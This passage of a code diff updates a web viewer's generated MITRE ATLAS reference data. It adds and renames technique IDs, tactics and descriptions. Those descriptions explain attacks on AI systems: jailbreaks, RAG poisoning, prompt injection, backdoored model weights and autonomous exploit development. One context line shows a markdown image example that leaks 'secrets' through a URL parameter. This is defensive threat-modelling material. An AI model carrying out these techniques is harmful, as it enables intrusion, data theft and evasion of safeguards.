@@ -300,6 +300,7 @@
         window.onload = async function () {
             const {
                 ATLAS_SEARCH_DIRECTIONS,
+                buildAtlasTechniqueUrl,
                 calculateAtlasRevealTargets,
                 getAtlasIndicatorAnchor,
                 normalizeAtlasSearchId,
@@ -380,8 +381,8 @@
                 }
             };
 
-            // Generated from the pinned MITRE ATLAS 2026.07 reference dataset.
-            // GENERATED: atlasTechToTactics from devtools/frameworks/mitre_atlas.json (MITRE ATLAS 2026.07). Run node scripts/sync-framework-view-data.cjs after framework reference updates.
+            // Generated from the pinned MITRE ATLAS 2026.08 reference dataset.
+            // GENERATED: atlasTechToTactics from devtools/frameworks/mitre_atlas.json (MITRE ATLAS 2026.08). Run node scripts/sync-framework-view-data.cjs after framework reference updates.
             const atlasTechToTactics = {
                 "AML.T0000": [
                     "Reconnaissance"
@@ -407,6 +408,9 @@
                 "AML.T0095": [
                     "Reconnaissance"
                 ],
+                "AML.T0116": [
+                    "Reconnaissance"
+                ],
                 "AML.T0002": [
                     "Resource Development"
                 ],
@@ -425,16 +429,13 @@
                 "AML.T0060": [
                     "Resource Development"
                 ],
-                "AML.T0065": [
-                    "Resource Development"
-                ],
-                "AML.T0066": [
-                    "Resource Development"
-                ],
                 "AML.T0079": [
                     "Resource Development"
                 ],
                 "AML.T0115": [
+                    "Resource Development"
+                ],
+                "AML.T0128": [
                     "Resource Development"
                 ],
                 "AML.T0010": [
@@ -442,7 +443,8 @@
                 ],
                 "AML.T0012": [
                     "Initial Access",
-                    "Privilege Escalation"
+                    "Privilege Escalation",
+                    "Lateral Movement"
                 ],
                 "AML.T0015": [
                     "Initial Access",
@@ -463,6 +465,9 @@
                     "Initial Access",
                     "Persistence"
                 ],
+                "AML.T0119": [
+                    "Initial Access"
+                ],
                 "AML.T0040": [
                     "AI Model Access"
                 ],
@@ -476,23 +481,38 @@
                     "AI Model Access"
                 ],
                 "AML.T0005": [
-                    "AI Attack Staging"
+                    "AI Attack Adaptation"
                 ],
                 "AML.T0018": [
-                    "AI Attack Staging",
+                    "AI Attack Adaptation",
                     "Persistence"
                 ],
                 "AML.T0042": [
-                    "AI Attack Staging"
+                    "AI Attack Adaptation"
                 ],
                 "AML.T0043": [
-                    "AI Attack Staging"
+                    "AI Attack Adaptation"
+                ],
+                "AML.T0065": [
+                    "AI Attack Adaptation"
+                ],
+                "AML.T0066": [
+                    "AI Attack Adaptation"
                 ],
                 "AML.T0088": [
-                    "AI Attack Staging"
+                    "AI Attack Adaptation"
                 ],
                 "AML.T0102": [
-                    "AI Attack Staging"
+                    "AI Attack Adaptation"
+                ],
+                "AML.T0117": [
+                    "AI Attack Adaptation"
+                ],
+                "AML.T0118": [
+                    "AI Attack Adaptation"
+                ],
+                "AML.T0124": [
+                    "AI Attack Adaptation"
                 ],
                 "AML.T0055": [
                     "Credential Access"
@@ -557,6 +577,12 @@
                 "AML.T0110": [
                     "Persistence"
                 ],
+                "AML.T0121": [
+                    "Persistence"
+                ],
+                "AML.T0125": [
+                    "Persistence"
+                ],
                 "AML.T0054": [
                     "Defense Evasion",
                     "Privilege Escalation"
@@ -597,6 +623,9 @@
                 "AML.T0111": [
                     "Defense Evasion"
                 ],
+                "AML.T0123": [
+                    "Defense Evasion"
+                ],
                 "AML.T0029": [
                     "Impact"
                 ],
@@ -633,6 +662,12 @@
                 "AML.T0085": [
                     "Collection"
                 ],
+                "AML.T0126": [
+                    "Collection"
+                ],
+                "AML.T0127": [
+                    "Collection"
+                ],
                 "AML.T0024": [
                     "Exfiltration"
                 ],
@@ -666,7 +701,13 @@
                 "AML.T0114": [
                     "Command and Control"
                 ],
+                "AML.T0120": [
+                    "Command and Control"
+                ],
                 "AML.T0091": [
+                    "Lateral Movement"
+                ],
+                "AML.T0122": [
                     "Lateral Movement"
                 ],
                 "AML.T0007": [
@@ -698,8 +739,8 @@
                 ]
             };
 
-                        // Generated from the pinned MITRE ATLAS 2026.07 reference dataset.
-                        // GENERATED: atlasTechNames from devtools/frameworks/mitre_atlas.json (MITRE ATLAS 2026.07). Run node scripts/sync-framework-view-data.cjs after framework reference updates.
+                        // Generated from the pinned MITRE ATLAS 2026.08 reference dataset.
+                        // GENERATED: atlasTechNames from devtools/frameworks/mitre_atlas.json (MITRE ATLAS 2026.08). Run node scripts/sync-framework-view-data.cjs after framework reference updates.
                         const atlasTechNames = {
                             "AML.T0000": "Search Open Technical Databases",
                             "AML.T0000.000": "Journals and Conference Proceedings",
@@ -745,8 +786,12 @@
                             "AML.T0016.000": "Adversarial AI Attack Implementations",
                             "AML.T0016.001": "Software Tools",
                             "AML.T0016.002": "Generative AI",
+                            "AML.T0016.003": "Exploits",
+                            "AML.T0016.004": "AI Agent Tools",
                             "AML.T0017": "Develop Capabilities",
                             "AML.T0017.000": "Adversarial AI Attacks",
+                            "AML.T0017.001": "Autonomous Exploit Development",
+                            "AML.T0017.002": "AI Agent Tools",
                             "AML.T0018": "Manipulate AI Model",
                             "AML.T0018.000": "Poison AI Model",
                             "AML.T0018.001": "Modify AI Model Architecture",
@@ -817,10 +862,10 @@
                             "AML.T0069.002": "System Prompt",
                             "AML.T0070": "RAG Poisoning",
                             "AML.T0071": "False RAG Entry Injection",
-                            "AML.T0072": "Reverse Shell",
+                            "AML.T0072": "Cyber Communication Channel",
                             "AML.T0073": "Impersonation",
                             "AML.T0074": "Masquerading",
-                            "AML.T0075": "Cloud Service Discovery",
+                            "AML.T0075": "Enterprise Resource Discovery",
                             "AML.T0076": "Corrupt AI Model",
                             "AML.T0077": "LLM Response Rendering",
                             "AML.T0078": "Drive-by Compromise",
@@ -842,7 +887,7 @@
                             "AML.T0086": "Exfiltration via AI Agent Tool Invocation",
                             "AML.T0087": "Gather Victim Identity Information",
                             "AML.T0088": "Generate Deepfakes",
-                            "AML.T0089": "Process Discovery",
+                            "AML.T0089": "Enterprise Environment Discovery",
                             "AML.T0090": "OS Credential Dumping",
                             "AML.T0091": "Use Alternate Authentication Material",
                             "AML.T0091.000": "Application Access Token",
@@ -878,11 +923,26 @@
                             "AML.T0115": "Publish Poisoned AI Artifacts",
                             "AML.T0115.000": "Datasets",
                             "AML.T0115.001": "Models",
-                            "AML.T0115.002": "AI Agent Tools"
+                            "AML.T0115.002": "AI Agent Tools",
+                            "AML.T0116": "Autonomous Reconnaissance",
+                            "AML.T0117": "Autonomous Attack-Path Adaptation",
+                            "AML.T0118": "Autonomous AI Agent Communication",
+                            "AML.T0118.000": "Communication via Shared Artifacts",
+                            "AML.T0118.001": "Direct Agent Communication",
+                            "AML.T0119": "Exploit Automated Artifact Processing Pipeline",
+                            "AML.T0120": "AI Artifact Repository",
+                            "AML.T0121": "AI Agent Environment Reconstruction",
+                            "AML.T0122": "Exploitation of Remote Services",
+                            "AML.T0123": "Obfuscated Files or Information",
+                            "AML.T0124": "Autonomous Attack Orchestration",
+                            "AML.T0125": "Create Account",
+                            "AML.T0126": "Automated Collection",
+                            "AML.T0127": "Data Staged",
+                            "AML.T0128": "Compromise Infrastructure"
                         };
 
-                        // Generated from the pinned MITRE ATLAS 2026.07 reference dataset.
-                        // GENERATED: atlasSubTechniques from devtools/frameworks/mitre_atlas.json (MITRE ATLAS 2026.07). Run node scripts/sync-framework-view-data.cjs after framework reference updates.
+                        // Generated from the pinned MITRE ATLAS 2026.08 reference dataset.
+                        // GENERATED: atlasSubTechniques from devtools/frameworks/mitre_atlas.json (MITRE ATLAS 2026.08). Run node scripts/sync-framework-view-data.cjs after framework reference updates.
                         const atlasSubTechniques = {
                             "AML.T0000": [
                                 "AML.T0000.000",
@@ -924,10 +984,14 @@
                             "AML.T0016": [
                                 "AML.T0016.000",
                                 "AML.T0016.001",
-                                "AML.T0016.002"
+                                "AML.T0016.002",
+                                "AML.T0016.003",
+                                "AML.T0016.004"
                             ],
                             "AML.T0017": [
-                                "AML.T0017.000"
+                                "AML.T0017.000",
+                                "AML.T0017.001",
+                                "AML.T0017.002"
                             ],
                             "AML.T0018": [
                                 "AML.T0018.000",
@@ -1010,11 +1074,15 @@
                                 "AML.T0115.000",
                                 "AML.T0115.001",
                                 "AML.T0115.002"
+                            ],
+                            "AML.T0118": [
+                                "AML.T0118.000",
+                                "AML.T0118.001"
                             ]
                         };
 
-                        // Generated from the pinned MITRE ATLAS 2026.07 reference dataset.
-                        // GENERATED: atlasTacticInfo from devtools/frameworks/mitre_atlas.json (MITRE ATLAS 2026.07). Run node scripts/sync-framework-view-data.cjs after framework reference updates.
+                        // Generated from the pinned MITRE ATLAS 2026.08 reference dataset.
+                        // GENERATED: atlasTacticInfo from devtools/frameworks/mitre_atlas.json (MITRE ATLAS 2026.08). Run node scripts/sync-framework-view-data.cjs after framework reference updates.
                         const atlasTacticInfo = {
                             "Reconnaissance": {
                                 "id": "AML.TA0002",
@@ -1032,9 +1100,9 @@
                                 "id": "AML.TA0000",
                                 "desc": "The adversary is attempting to gain some level of access to an AI model. AI Model Access enables techniques that use various types of access to the AI model that can be used by the adversary to gain information, develop attacks, and as a means to input data to the model. The level of access can range from the full knowledge of the internals of the model to access to the physical environment where data is collected for use in the AI model. The adversary may use varying levels of model access during the course of their attack, from staging the attack to impacting the target system. Access to an AI model may require access to the system housing the model, the model may be publicly accessible via an API, or it may be accessed indirectly via interaction with a product or service that utilizes AI as part of its processes."
                             },
-                            "AI Attack Staging": {
+                            "AI Attack Adaptation": {
                                 "id": "AML.TA0001",
-                                "desc": "The adversary is leveraging their knowledge of and access to the target system to tailor the attack. AI Attack Staging consists of techniques adversaries use to prepare their attack on the target AI model. Techniques can include training proxy models, poisoning the target model, and crafting adversarial data to feed the target model. Some of these techniques can be performed in an offline manner and are thus difficult to mitigate. These techniques are often used to achieve the adversary's end goal."
+                                "desc": "The adversary is adapting capabilities, methods, knowledge, or objectives into attack-ready outputs for a target or current operational conditions. [AI Attack Adaptation](/tactics/AML.T0001) consists of techniques adversaries use to transform reusable capabilities, general attack methods, target knowledge, high-level objectives, and operational observations into target- or context-specific attack-ready outputs. Adaptation may target an AI system directly, or it may use an AI capability to materially shape malicious content for attacks against AI components, software, infrastructure, people, or other systems. Adapted outputs may include proxy or manipulated models, adversarial data, crafted prompts or retrieval content, deepfakes, or generated malicious commands or code. Outputs can also include actions for an autonomous agent such as agent tasking, high-level objectives, action sequences, and tool instructions. AI Attack Adaptation may occur before [Initial Access](/tactics/AML.TA0004) is achieved and repeatedly throughout an operation. Adversaries may use knowledge obtained through [Reconnaissance](/tactics/AML.TA0002) or [Discovery](/tactics/AML.TA0008), access obtained through [AI Model Access](/tactics/AML.TA0000), and capabilities established through [Resource Development](/tactics/AML.TA0003). [Resource Development](/tactics/AML.TA0003) creates or obtains reusable capabilities whereas [AI Attack Adaptation](/tactics/AML.TA0001) applies or modifies those capabilities for a target, objective, or current operational condition."
                             },
                             "Credential Access": {
                                 "id": "AML.TA0013",
@@ -1082,8 +1150,8 @@
                             }
                         };
 
-                        // Generated from the pinned MITRE ATLAS 2026.07 reference dataset.
-                        // GENERATED: atlasTechDescs from devtools/frameworks/mitre_atlas.json (MITRE ATLAS 2026.07). Run node scripts/sync-framework-view-data.cjs after framework reference updates.
+                        // Generated from the pinned MITRE ATLAS 2026.08 reference dataset.
+                        // GENERATED: atlasTechDescs from devtools/frameworks/mitre_atlas.json (MITRE ATLAS 2026.08). Run node scripts/sync-framework-view-data.cjs after framework reference updates.
                         const atlasTechDescs = {
                             "AML.T0000": "Adversaries may search for publicly available research and technical documentation to learn how and where AI is used within a victim organization. The adversary can use this information to identify targets for attack, or to tailor an existing attack to make it more effective. Organizations often use open source model architectures trained on additional proprietary data in production. Knowledge of this underlying architecture allows the adversary to craft more realistic proxy models ([Create Proxy AI Model](/techniques/AML.T0005)). An adversary can search these resources for publications by authors employed at the victim organization. Research and technical materials may exist as academic papers published in [Journals and Conference Proceedings](/techniques/AML.T0000.000), or stored in [Pre-Print Repositories](/techniques/AML.T0000.001), as well as [Technical Blogs](/techniques/AML.T0000.002).",
                             "AML.T0000.000": "Many of the publications accepted at premier artificial intelligence conferences and journals come from commercial labs. Some journals and conferences are open access, others may require paying for access or a membership. These publications will often describe in detail all aspects of a particular approach for reproducibility. This information can be used by adversaries to implement the paper.",
@@ -1128,9 +1196,13 @@
                             "AML.T0016": "Adversaries may search for and obtain software capabilities for use in their operations. Capabilities may be specific to AI-based attacks [Adversarial AI Attack Implementations](/techniques/AML.T0016.000) or generic software tools repurposed for malicious intent ([Software Tools](/techniques/AML.T0016.001)). In both instances, an adversary may modify or customize the capability to aid in targeting a particular AI-enabled system.",
                             "AML.T0016.000": "Adversaries may search for existing open source implementations of AI attacks. The research community often publishes their code for reproducibility and to further future research. Libraries intended for research purposes, such as CleverHans, the Adversarial Robustness Toolbox, and FoolBox, can be weaponized by an adversary. Adversaries may also obtain and use tools that were not originally designed for adversarial AI attacks as part of their attack.",
                             "AML.T0016.001": "Adversaries may search for and obtain software tools to support their operations. Software designed for legitimate use may be repurposed by an adversary for malicious intent. An adversary may modify or customize software tools to achieve their purpose. Software tools used to support attacks on AI systems are not necessarily AI-based themselves.",
-                            "AML.T0016.002": "Adversaries may search for and obtain generative AI models or tools, such as large language models (LLMs), to assist them in various steps of their operation. Generative AI can be used in a variety of malicious ways, such as to generating malware, to [Generate Deepfakes](/techniques/AML.T0088), to [Generate Malicious Commands](/techniques/AML.T0102), for [Retrieval Content Crafting](/techniques/AML.T0066), or to generate [Phishing](/techniques/AML.T0052) content. Adversaries may obtain open source models and serve them locally using frameworks such as [Ollama](https://ollama.com/) or [vLLM]( https://docs.vllm.ai/en/latest/). They may host them using cloud infrastructure. Or, they may leverage AI service providers such as HuggingFace. They may need to jailbreak the model (see [LLM Jailbreak](/techniques/AML.T0054)) to bypass any restrictions put in place to limit the types of responses it can generate. They may also need to break the terms of service of the model's developer. Generative AI models may also be \"uncensored\" meaning they are designed to generate content without any restrictions such as guardrails or content filters. Uncensored GenAI is ripe for abuse by cybercriminals [[blog]] [[gbhackers]]. Models may be fine-tuned to remove alignment and guardrails [[erichartford]] or be subjected to targeted manipulations to bypass refusal [[arxiv]] resulting in uncensored variants of the model. Uncensored models may be built for offensive and defensive cybersecurity [[taico]], which can be abused by an adversary. There are also models that are expressly designed and advertised for malicious use [[gbhackers-1]].",
-                            "AML.T0017": "Adversaries may develop their own capabilities to support operations. This process encompasses identifying requirements, building solutions, and deploying capabilities. Capabilities used to support attacks on AI-enabled systems are not necessarily AI-based themselves. Examples include setting up websites with adversarial information or creating Jupyter notebooks with obfuscated exfiltration code.",
+                            "AML.T0016.002": "Adversaries may search for and obtain generative AI models or tools, such as large language models (LLMs), to assist them in various steps of their operation. Generative AI can be used in a variety of malicious ways, such as to generate malware, to [Generate Deepfakes](/techniques/AML.T0088), to [Generate Malicious Commands](/techniques/AML.T0102), for [Retrieval Content Crafting](/techniques/AML.T0066), or to generate [Phishing](/techniques/AML.T0052) content. Adversaries may obtain open source models and serve them locally using frameworks such as [Ollama](https://ollama.com/) or [vLLM]( https://docs.vllm.ai/en/latest/). They may host them using cloud infrastructure. Or, they may leverage AI service providers such as HuggingFace. They may need to jailbreak the model (see [LLM Jailbreak](/techniques/AML.T0054)) to bypass any restrictions put in place to limit the types of responses it can generate. They may also need to break the terms of service of the model's developer. Generative AI models may also be \"uncensored\" meaning they are designed to generate content without any restrictions such as guardrails or content filters. Uncensored GenAI is ripe for abuse by cybercriminals [[blog]] [[gbhackers]]. Models may be fine-tuned to remove alignment and guardrails [[erichartford]] or be subjected to targeted manipulations to bypass refusal [[arxiv]] resulting in uncensored variants of the model. Uncensored models may be built for offensive and defensive cybersecurity [[taico]], which can be abused by an adversary. There are also models that are expressly designed and advertised for malicious use [[gbhackers-1]].",
+                            "AML.T0016.003": "Adversaries may search for and obtain exploits to support their operations. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Exploits may be downloaded from public repositories, acquired from private sources, purchased, stolen, or obtained from vulnerability research and exploit-sharing communities. An obtained exploit may be used without modification or serve as input to later adaptation or development.",
+                            "AML.T0016.004": "Adversaries may search for and obtain tools extend the capabilities of an AI agent. These capabilities may allow an agent to interact with operating systems, browsers, networks, cloud services, data stores, software repositories, identity systems, or other external resources. AI agent tools may be distributed as Model Context Protocol servers, plugins, skills, connectors, function libraries, computer-use adapters, execution brokers, remote APIs, or similar integrations. Adversaries may obtain legitimate tools and configure them for malicious use, acquire modified or purpose-built tools, or combine multiple integrations into an operational toolset. Agent tools may expose model-visible descriptions and executable interfaces that influence which capabilities an agent selects and how it invokes them. Obtaining these tools may give an agent access to resources, credentials, or actions that are unavailable through model inference alone.",
+                            "AML.T0017": "Adversaries may develop their own capabilities to support operations. This process encompasses identifying requirements, building or adapting solutions, validating or packaging capabilities, and preparing them for deployment. Capabilities used to support attacks on AI-enabled systems are not necessarily AI-based themselves. Adversaries may also use autonomous AI agents to iteratively develop capabilities, including exploit methods for known or previously unknown software vulnerabilities. Examples include creating adversarial AI attacks, developing websites containing malicious instructions for AI agents, crafting malicious AI artifacts, building malware, or implementing software exploits.",
                             "AML.T0017.000": "Adversaries may develop their own adversarial attacks. They may leverage existing libraries as a starting point ([Adversarial AI Attack Implementations](/techniques/AML.T0016.000)). They may implement ideas described in public research papers or develop custom made attacks for the victim model.",
+                            "AML.T0017.001": "An autonomous AI agent may identify a software vulnerability and develop or materially adapt an exploit capability with limited human direction. The agent may analyze source code, documentation, service behavior, and error responses to infer a vulnerability and the conditions required to exploit it. The agent may formulate and test vulnerability hypotheses, generate probes or payloads, interpret the results, and revise its approach through repeated action-observation cycles. It may combine multiple weaknesses into an exploit chain or package the resulting capability for later use. Validation may establish that the exploit produces the intended access, code execution, or other technical effect. The vulnerability may be publicly known or previously unknown.",
+                            "AML.T0017.002": "Adversaries may develop or materially adapt tools, integrations, or tool servers designed to extend the capabilities of an AI agent. These capabilities may allow an agent to interact with operating systems, browsers, networks, cloud services, data stores, software repositories, identity systems, or other external resources. AI agent tools may be implemented as Model Context Protocol servers, plugins, skills, connectors, function libraries, computer-use adapters, execution brokers, remote APIs, or similar model-callable interfaces. Development may include creating executable functionality, model-visible tool descriptions, procedural instructions, input schemas, authentication methods, permission handling, or packaging needed to make a capability available to an agent.",
                             "AML.T0018": "Adversaries may manipulate an AI model artifact or its bundled components to change AI system behavior, introduce malicious code, or establish persistent malicious functionality. This may include modifying model weights, model architecture, or prompt-construction logic. Manipulated artifacts may retain expected behavior under ordinary conditions while activating malicious behavior only for selected inputs, contexts, or deployment conditions.",
                             "AML.T0018.000": "Adversaries may manipulate an AI model's weights to change it's behavior or performance, resulting in a poisoned model. Adversaries may poison a model by directly manipulating its weights, training the model on poisoned data, further fine-tuning the model, or otherwise interfering with its training process. The change in behavior of poisoned models may be limited to targeted categories in predictive AI models, or targeted topics, concepts, or facts in generative AI models, or aim for a general performance degradation.",
                             "AML.T0018.001": "Adversaries may directly modify an AI model's architecture to re-define it's behavior. This can include adding or removing layers as well as adding pre or post-processing operations. The effects could include removing the ability to predict certain classes, adding erroneous operations to increase computation costs, or degrading performance. Additionally, a separate adversary-defined network could be injected into the computation graph, which can change the behavior based on the inputs, effectively creating a backdoor.",
@@ -1201,10 +1273,10 @@
                             "AML.T0069.002": "Adversaries may discover a large language model's system instructions provided by the AI system builder to learn about the system's capabilities and circumvent its guardrails.",
                             "AML.T0070": "Adversaries may inject malicious content into data indexed by a retrieval augmented generation (RAG) system to contaminate a future thread through RAG-based search results. This may be accomplished by placing manipulated documents in a location the RAG indexes (see [Gather RAG-Indexed Targets](/techniques/AML.T0064)). The content may be targeted such that it would always surface as a search result for a specific user query. The adversary's content may include false or misleading information. It may also include prompt injections with malicious instructions, or false RAG entries.",
                             "AML.T0071": "Adversaries may introduce false entries into a victim's retrieval augmented generation (RAG) database. Content designed to be interpreted as a document by the large language model (LLM) used in the RAG system is included in a data source being ingested into the RAG database. When a RAG entry containing the false document is retrieved, the LLM is tricked into treating part of the retrieved content as a false RAG result. By including a false RAG document inside of a regular RAG entry, it bypasses data monitoring tools. It also prevents the document from being deleted directly. The adversary may use discovered system keywords to learn how to instruct a particular LLM to treat content as a RAG entry. They may be able to manipulate the injected entry's metadata including document title, author, and creation date.",
-                            "AML.T0072": "Adversaries may utilize a reverse shell to communicate and control the victim system. Typically, a user uses a client to connect to a remote machine which is listening for connections. With a reverse shell, the adversary is listening for incoming connections initiated from the victim system.",
+                            "AML.T0072": "Adversaries may establish or use cyber communication channels for command and control. A channel may use any network protocol, service, repository, relay, or other intermediary and may operate synchronously or asynchronously. See the ATT&CK [Command and Control](https://attack.mitre.org/tactics/TA0011/) tactic for techniques describing specific protocols, services, relays, tunneling methods, and communication patterns.",
                             "AML.T0073": "Adversaries may impersonate a trusted person or organization in order to persuade and trick a target into performing some action on their behalf. For example, adversaries may communicate with victims (via [Phishing](/techniques/AML.T0052), or [Spearphishing via Social Engineering LLM](/techniques/AML.T0052.000)) while impersonating a known sender such as an executive, colleague, or third-party vendor. Established trust can then be leveraged to accomplish an adversary's ultimate goals, possibly against multiple victims. Adversaries may target resources that are part of the AI DevOps lifecycle, such as model repositories, container registries, and software registries.",
                             "AML.T0074": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names. In public artifact registries such as HuggingFace, adversaries may reclaim or recreate a previously trusted namespace or path after it is deleted or renamed. Systems that resolve stale, unpinned identifiers may then retrieve adversary-controlled artifacts that appear to be the originally trusted artifact.",
-                            "AML.T0075": "Adversaries may attempt to enumerate the cloud services running on a system after gaining access. These methods can differ from platform-as-a-service (PaaS), to infrastructure-as-a-service (IaaS), software-as-a-service (SaaS), or AI-as-a-service (AIaaS). Many services exist throughout the various cloud providers and can include Continuous Integration and Continuous Delivery (CI/CD), Lambda Functions, Entra ID, AI Inference, Generative AI, Agentic AI, etc. They may also include security services, such as AWS GuardDuty and Microsoft Defender for Cloud, and logging services, such as AWS CloudTrail and Google Cloud Audit Logs. Adversaries may attempt to discover information about the services enabled throughout the environment. Azure tools and APIs, such as the Microsoft Graph API and Azure Resource Manager API, can enumerate resources and services, including applications, management groups, resources and policy definitions, and their relationships that are accessible by an identity. They may use tools to check credentials and enumerate the AI models available in various AIaaS providers' environments including AI21 Labs, Anthropic, AWS Bedrock, Azure, ElevenLabs, MakerSuite, Mistral, OpenAI, OpenRouter, and GCP Vertex AI [[sysdig]].",
+                            "AML.T0075": "Adversaries may discover resources available within an enterprise environment and information needed to identify or access them. Resources may include accounts, groups, systems, devices, virtual machines, files, directories, storage volumes, cloud objects, containers, applications, software, processes, services, network shares, repositories, policies, logs, and other local, remote, or cloud-hosted assets. Adversaries may enumerate, query, scan, or browse resources to determine what exists, where it is located, how it is related to other resources, and whether it is accessible or useful for subsequent actions. See the ATT&CK [Discovery](https://attack.mitre.org/tactics/TA0007/) tactic for techniques describing specific resources, environmental characteristics, and discovery mechanisms.",
                             "AML.T0076": "An adversary may purposefully corrupt a malicious AI model file so that it cannot be successfully deserialized in order to evade detection by a model scanner. The corrupt model may still successfully execute malicious code before deserialization fails.",
                             "AML.T0077": "An adversary may get a large language model (LLM) to respond with private information that is hidden from the user when the response is rendered by the user's client. The private information is then exfiltrated. This can take the form of rendered images, which automatically make a request to an adversary controlled server. The adversary gets AI to present an image to the user, which is rendered by the user's client application with no user clicks required. The image is hosted on an attacker-controlled website, allowing the adversary to exfiltrate data through image request parameters. Variants include HTML tags and markdown For example, an LLM may produce the following markdown: ``` ![ATLAS](https://atlas.mitre.org/image.png?secrets=\"private data\") ``` Which is rendered by the client as: ``` <img src=\"https://atlas.mitre.org/image.png?secrets=\"private data\"> ``` When the request is received by the adversary's server hosting the requested image, they receive the contents of the `secrets` query parameter.",
                             "AML.T0078": "Adversaries may gain access to an AI system through a user visiting a website over the normal course of browsing, or an AI agent retrieving information from the web on behalf of a user. Websites can contain an [LLM Prompt Injection](/techniques/AML.T0051) which, when executed, can change the behavior of the AI model. The same approach may be used to deliver other types of malicious code that don't target AI directly (See [Drive-by Compromise in ATT&CK](https://attack.mitre.org/techniques/T1189/)).",
@@ -1226,7 +1298,7 @@
                             "AML.T0086": "AI agent tools capable of performing write operations may be invoked to exfiltrate data to an adversary. Sensitive information can be encoded into the tool's input parameters and transmitted to an adversary-controlled location (such as an inbox, document, or server) as part of a seemingly legitimate action. Variants include sending emails, creating or modifying documents, updating CRM records, or even generating media such as images or videos. The invoked tool itself may be legitimate but invoked by an adversary via [LLM Prompt Injection](/techniques/AML.T0051), or the tool may be malicious (See [AI Agent Tool Poisoning](/techniques/AML.T0110)). [AI Agent Tool Poisoning](/techniques/AML.T0110) can also be used to manipulate the inputs and destination of a separate legitimate tool, invoked through normal usage by the victim.",
                             "AML.T0087": "Adversaries may gather information about the victim's identity that can be used during targeting. Information about identities may include a variety of details, including personal data (ex: employee names, email addresses, photos, etc.) as well as sensitive details such as credentials or multi-factor authentication (MFA) configurations. Adversaries may gather this information in various ways, such as direct elicitation, [Search Victim-Owned Websites](/techniques/AML.T0003), or via leaked information on the black market. Adversaries may use the gathered victim data to Create Deepfakes and impersonate them in a convincing manner. This may create opportunities for adversaries to [Establish Accounts](/techniques/AML.T0021) under the impersonated identity, or allow them to perform convincing [Phishing](/techniques/AML.T0052) attacks.",
                             "AML.T0088": "Adversaries may use generative artificial intelligence (GenAI) to create synthetic media (i.e. imagery, video, audio, and text) that appear authentic. These \"[deepfakes]( https://en.wikipedia.org/wiki/Deepfake)\" may mimic a real person or depict fictional personas. Adversaries may use deepfakes for impersonation to conduct [Phishing](/techniques/AML.T0052) or to evade AI applications such as biometric identity verification systems (see [Evade AI Model](/techniques/AML.T0015)). Manipulation of media has been possible for a long time, however GenAI reduces the skill and level of effort required, allowing adversaries to rapidly scale operations to target more users or systems. It also makes real-time manipulations feasible. Adversaries may utilize open-source models and software that were designed for legitimate use cases to generate deepfakes for malicious use. However, there are some projects specifically tailored towards malicious use cases such as [ProKYC](https://www.catonetworks.com/blog/prokyc-selling-deepfake-tool-for-account-fraud-attacks/).",
-                            "AML.T0089": "Adversaries may attempt to get information about processes running on a system. Once obtained, this information could be used to gain an understanding of common AI-related software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Identifying the AI software stack can then lead an adversary to new targets and attack pathways. AI-related software may require application tokens to authenticate with backend services. This provides opportunities for [Credential Access](/tactics/AML.TA0013) and [Lateral Movement](/tactics/AML.TA0015). In Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or `Get-Process` via PowerShell. Information about processes can also be extracted from the output of Native API calls such as `CreateToolhelp32Snapshot`. In Mac and Linux, this is accomplished with the `ps` command. Adversaries may also opt to enumerate processes via `/proc`.",
+                            "AML.T0089": "Adversaries may discover configurations, conditions, relationships, activity, and other characteristics of an enterprise environment. This may include system and network configuration; active connections, processes, windows, and users; permissions, trust relationships, and policy settings; installed defensive or backup capabilities; network traffic; browser and registry information; or environmental properties such as location, language, time, connectivity, virtualization, debugging, and sandbox indicators. Adversaries may query or passively observe this information to understand how the environment is configured and operating, identify access paths or security controls, detect monitoring or analysis, and select or adapt subsequent actions. See the ATT&CK [Discovery](https://attack.mitre.org/tactics/TA0007/) tactic for techniques describing specific environmental characteristics and discovery mechanisms.",
                             "AML.T0090": "Adversaries may extract credentials from OS caches, application memory, or other sources on a compromised system. Credentials are often in the form of a hash or clear text, and can include usernames and passwords, application tokens, or other authentication keys. Credentials can be used to perform [Lateral Movement](/tactics/AML.TA0015) to access other AI services such as AI agents, LLMs, or AI inference APIs. Credentials could also give an adversary access to other software tools and data sources that are part of the AI DevOps lifecycle.",
                             "AML.T0091": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. AI services commonly use alternate authentication material as a primary means for users to make queries, making them vulnerable to this technique.",
                             "AML.T0091.000": "Adversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users or services and used in lieu of login credentials. Application access tokens are used to make authorized API requests on behalf of a user or service and are commonly used to access resources in cloud, container-based applications, software-as-a-service (SaaS), and AI-as-a-service(AIaaS). They are commonly used for AI services such as chatbots, LLMs, and predictive inference APIs.",
@@ -1262,7 +1334,22 @@
                             "AML.T0115": "Adversaries may create or modify AI artifacts and publish them through public or shared distribution channels to facilitate compromise of downstream AI systems. Poisoned AI artifacts may include datasets, models, and AI agent tools containing malicious content, behaviors, code, or configurations. Adversaries may publish novel artifacts or malicious variants of legitimate artifacts through dataset or model repositories, package registries, source code repositories, tool hubs, or remotely hosted services. Victims may subsequently acquire and integrate these artifacts through [AI Supply Chain Compromise](/techniques/AML.T0010).",
                             "AML.T0115.000": "Adversaries may publish poisoned datasets intended for training or fine-tuning AI models. The dataset may be newly created or a modified variant of a legitimate dataset and may contain manipulated samples, labels, annotations, or metadata. Adversaries may distribute poisoned datasets through dataset repositories, code repositories, file-sharing services, or compromised data sources. A victim that incorporates the dataset into a training pipeline may be affected by [Training Data Poisoning](/techniques/AML.T0020), potentially through [AI Supply Chain Compromise](/techniques/AML.T0010).",
                             "AML.T0115.001": "Adversaries may publish poisoned AI models through model registries, code repositories, or other model distribution channels. The model may be newly created or a modified variant of a legitimate model and may contain manipulated weights, configurations, architecture, serialized code, or other components that produce malicious behavior or execute malicious code. Victims may subsequently download and integrate the model through [AI Supply Chain Compromise](/techniques/AML.T0010).",
